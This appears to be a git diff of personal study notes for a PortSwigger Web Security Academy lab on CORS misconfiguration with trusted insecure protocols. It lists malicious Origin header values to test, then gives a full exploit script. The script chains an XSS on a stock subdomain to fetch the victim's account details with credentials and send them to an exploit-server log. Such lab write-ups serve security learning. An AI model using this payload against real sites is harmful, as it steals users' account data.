@@ -37,4 +37,24 @@ B) CORS vulnerability with trusted null origin
             };
             </script>"></iframe>
 
-C) 
+C) CORS vulnerability with trusted insecure protocols 
+
+    TO detect we can try different methods.
+            1, origin: *
+            2, origin: https://attacker.com
+            3, origin: null
+            4, origin: https://attacker.OriginalURL.com
+            5, origin: https://OriginalURL.com.attacker.com
+            
+        These things have to give {
+            Access-Control-Allow-Origin: https://attacker.OriginalURL.com
+            Access-Control-Allow-Credentials: true
+        }
+    on this lab when we try all they wont work except the method 4, there for we will try to find a subdomain, for that you can use tools, also you can check the site endpoints.
+    finally, you will get stock.webacademy.com domain so we will try any open vuln on it if the site have some vuln like xss, we will craft our JS code like below.
+
+    <script>
+    document.location="http://stock.0a55009e038cde09c07b54ee00230042.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a55009e038cde09c07b54ee00230042.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a13006e037fdecbc0ae53ee0174000f.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    </script>
+
+D) 
